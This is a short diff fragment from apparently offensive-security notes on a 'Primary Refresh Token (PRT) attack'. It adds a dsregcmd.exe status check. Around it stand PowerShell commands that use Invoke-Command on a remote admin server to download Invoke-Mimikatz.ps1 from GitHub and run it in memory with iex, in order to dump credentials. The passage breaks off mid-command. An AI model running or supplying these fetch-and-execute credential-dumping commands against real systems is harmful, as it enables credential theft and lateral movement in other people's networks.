@@ -2,6 +2,7 @@
 
 ### Primary Refresh Token (PRT) attack
 ```
+dsregcmd.exe /status
 Invoke-Command -
 Session $infradminsrv -ScriptBlock{iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")}
 Invoke-Command -
